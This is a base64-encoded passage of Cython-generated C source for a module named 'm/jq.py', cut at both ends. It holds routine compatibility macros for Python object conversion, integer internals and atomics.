ICAgICAgICAoaXNfc2lnbmVkIHx8IGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYgPT0gKHR5cGUpUFlfU1NJWkVfVF9NQVgpKSkgIClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9pc192YWxpZF9pbmRleChQeV9zc2l6ZV90IGksIFB5X3NzaXplX3QgbGltaXQpIHtcbiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0O1xufVxuI2lmIGRlZmluZWQgKF9fY3BsdXNwbHVzKSAmJiBfX2NwbHVzcGx1cyA+PSAyMDExMDNMXG4gICAgI2luY2x1ZGUgPGNzdGRsaWI+XG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBzdGQ6OmFicyh2YWx1ZSlcbiNlbGlmIFNJWkVPRl9JTlQgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKVxuI2VsaWYgU0laRU9GX0xPTkcgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgbGFicyh2YWx1ZSlcbiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKChQeV9zc2l6ZV90KV9hYnM2NCh2YWx1ZSkpXG4jZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKVxuI2VsaWYgZGVmaW5lZCAoX19HTlVDX18pXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBfX2J1aWx0aW5fbGxhYnModmFsdWUpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKCh2YWx1ZTwwKSA/IC12YWx1ZSA6IHZhbHVlKVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0Kik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqLCBQeV9zc2l6ZV90KiBsZW5ndGgpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShzLCBsKSBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZSgoY29uc3QgY2hhciopcywgbClcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nICAgICAgICBQeUJ5dGVzX0Zyb21TdHJpbmdcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU3RyaW5nKHMpICAgICAoKGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTdHJpbmcocykgICAgICgoY29uc3QgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Bc1N0cmluZyhzKSBQeUJ5dGVBcnJheV9Bc1N0cmluZyhzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTdHJpbmcocykgICAgKChjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21DU3RyaW5nKHMpICAgX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZygoY29uc3QgY2hhciopcylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbU9yZGluYWwobykgICAgICAgUHlVbmljb2RlX0Zyb21PcmRpbmFsKChpbnQpbylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0FzVW5pY29kZSAgICAgICAgICAgIFB5VW5pY29kZV9Bc1VuaWNvZGVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfTmV3UmVmKVxuICAgIHJldHVybiBQeV9OZXdSZWYob2JqKTtcbiNlbHNlXG4gICAgUHlfSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1hOZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZilcbiAgICByZXR1cm4gUHlfWE5ld1JlZihvYmopO1xuI2Vsc2VcbiAgICBQeV9YSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KTtcbiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXFxcbiAgICAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChvYmopKSA/IF9fUHl4X05ld1JlZihvYmopIDogUHlTZXF1ZW5jZV9UdXBsZShvYmopKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUxvbmdfRnJvbVNpemVfdChzaXplX3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqKTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgKFB5RmxvYXRfQ2hlY2tFeGFjdCh4KSA/IFB5RmxvYXRfQVNfRE9VQkxFKHgpIDogUHlGbG9hdF9Bc0RvdWJsZSh4KSlcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9BU19ET1VCTEUoeClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KVxuI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0Zsb2F0KHgpICgoZmxvYXQpIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkpXG4jZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0ludCh4KSAoUHlMb25nX0NoZWNrRXhhY3QoeCkgPyBfX1B5eF9OZXdSZWYoeCkgOiBQeU51bWJlcl9Mb25nKHgpKVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBN1xuICAjaWZuZGVmIF9QeUxvbmdfU0lHTl9NQVNLXG4gICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzXG4gICNlbmRpZlxuICAjaWZuZGVmIF9QeUxvbmdfTk9OX1NJWkVfQklUU1xuICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDNcbiAgI2VuZGlmXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ24oeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnICYgX1B5TG9uZ19TSUdOX01BU0spXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgICghX19QeXhfUHlMb25nX0lzTmVnKHgpKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1plcm8oeCkgIChfX1B5eF9QeUxvbmdfU2lnbih4KSAmIDEpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgIChfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICAoKFB5X3NzaXplX3QpICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnID4+IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcXFxuICAgICAgICAoKDEgLSAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX1NpZ24oeCkpICogX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpXG4gICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgICAgIFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QoKFB5TG9uZ09iamVjdCopIHgpXG4gICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpICBQeVVuc3RhYmxlX0xvbmdfQ29tcGFjdFZhbHVlKChQeUxvbmdPYmplY3QqKSB4KVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPCAoMiA8PCBfUHlMb25nX05PTl9TSVpFX0JJVFMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZW5kaWZcbiAgdHlwZWRlZiBQeV9zc2l6ZV90ICBfX1B5eF9jb21wYWN0X3B5bG9uZztcbiAgdHlwZWRlZiBzaXplX3QgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZztcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOZWcoeCkgIChQeV9TSVpFKHgpIDwgMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgIChQeV9TSVpFKHgpID49IDApXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNQb3MoeCkgIChQeV9TSVpFKHgpID4gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgICgoUHlfU0laRSh4KSA9PSAwKSA/IDAgOiBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkgIFB5X1NJWkUoeClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAoUHlfU0laRSh4KSA9PSAwIHx8IFB5X1NJWkUoeCkgPT0gMSB8fCBQeV9TSVpFKHgpID09IC0xKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcXFxuICAgICAgICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAoc2RpZ2l0KSAwIDogKChQeV9TSVpFKHgpIDwgMCkgPyAtKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdIDogKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKSlcbiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nO1xuICB0eXBlZGVmIGRpZ2l0ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7XG4gICNlbmRpZlxuICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSk7XG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE1XG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0cyh4KSAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5vYl9kaWdpdClcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5vYl9kaWdpdClcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4XG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBzaXplKSBQeVVuaWNvZGVfRGVjb2RlVVRGOChjX3N0ciwgc2l6ZSwgTlVMTClcbiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBzaXplKSBQeVVuaWNvZGVfRGVjb2RlQVNDSUkoY19zdHIsIHNpemUsIE5VTEwpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpXG4jZW5kaWZcblxuXG5cbiNpZiBkZWZpbmVkKF9fR05VQ19fKSAgICAgJiYgKF9fR05VQ19fID4gMiB8fCAoX19HTlVDX18gPT0gMiAmJiAoX19HTlVDX01JTk9SX18gPiA5NSkpKVxuICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpXG4gICNkZWZpbmUgdW5saWtlbHkoeCkgX19idWlsdGluX2V4cGVjdCghISh4KSwgMClcbiNlbHNlIFxuICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KVxuICAjZGVmaW5lIHVubGlrZWx5KHgpICh4KVxuI2VuZGlmIFxuXG4jaWZkZWYgX19jcGx1c3BsdXNcbiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0xcbiNpbmNsdWRlIDx0eXBlX3RyYWl0cz5cbiNlbmRpZlxudGVtcGxhdGUgPHR5cGVuYW1lIFQ+XG5zdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7XG4jaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMXG4gICAgaWYgKChzdGQ6OmlzX3RyaXZpYWxseV9kZWZhdWx0X2NvbnN0cnVjdGlibGU8VD46OnZhbHVlKSlcbiNlbmRpZlxuICAgICAgICAqcHRyID0gVCgpO1xuICAgICh2b2lkKXB0cjtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X3ByZXRlbmRfdG9faW5pdGlhbGl6ZSh2b2lkKiBwdHIpIHsgKHZvaWQpcHRyOyB9XG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X20gPSBOVUxMO1xuI2VuZGlmXG5zdGF0aWMgaW50IF9fcHl4X2xpbmVubztcbnN0YXRpYyBpbnQgX19weXhfY2xpbmVubyA9IDA7XG5zdGF0aWMgY29uc3QgY2hhciAqIGNvbnN0IF9fcHl4X2NmaWxlbm0gPSBfX0ZJTEVfXztcbnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTtcblxuXG5cbnN0YXRpYyBjb25zdCBjaGFyKiBjb25zdCBfX3B5eF9mW10gPSB7XG4gICJtL2pxLnB5Iixcbn07XG5cblxuI2luY2x1ZGUgPHB5dGhyZWFkLmg+XG4jaWZuZGVmIENZVEhPTl9BVE9NSUNTXG4gICAgI2RlZmluZSBDWVRIT05fQVRPTUlDUyAxXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfQ1lUSE9OX0FUT01JQ1NfRU5BQkxFRCgpIENZVEhPTl9BVE9NSUNTXG4jZGVmaW5lIF9fUFlYX0dFVF9DWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORygpIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnRcbiNkZWZpbmUgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGludFxuI2lmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fU1REQ19WRVJTSU9OX18pICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKVxuICAgICNpbmNsdWRlIDxzdGRhdG9taWMuaD5cbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICAgICAgICAgICAgICAgICAgKF9fY3BsdXNwbHVzID49IDIwMTEwM0wpIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSlcbiAgICAjaW5jbHVkZSA8YXRvbWljPlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgIWRlZmluZWQoX19TVERDX05PX0FUT01JQ1NfXykgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKVxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhdG9taWNfaW50XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfbm9uYXRvbWljX3B0cl90eXBlIHVpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgYXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX3JlbGF4ZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIGF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBhdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgYXRvbWljX2xvYWQodmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgYXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIG1lbW9yeV9vcmRlcl9hY3F1aXJlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgYXRvbWljX2V4Y2hhbmdlKHZhbHVlLCAoX19weXhfbm9uYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBzdGFuZGFyZCBDIGF0b21pY3MiKVxuICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUylcbiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyJcbiAgICAjZW5kaWZcbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICAgICAgICAgICAgICAgICAgKF9fY3BsdXNwbHVzID49IDIwMTEwM0wpIHx8XFxcblxcXG4gICAgICAgICAgICAgICAgICAgIChkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNzAwKSkgJiZcXFxuICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKVxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnRcbiAgICAjZG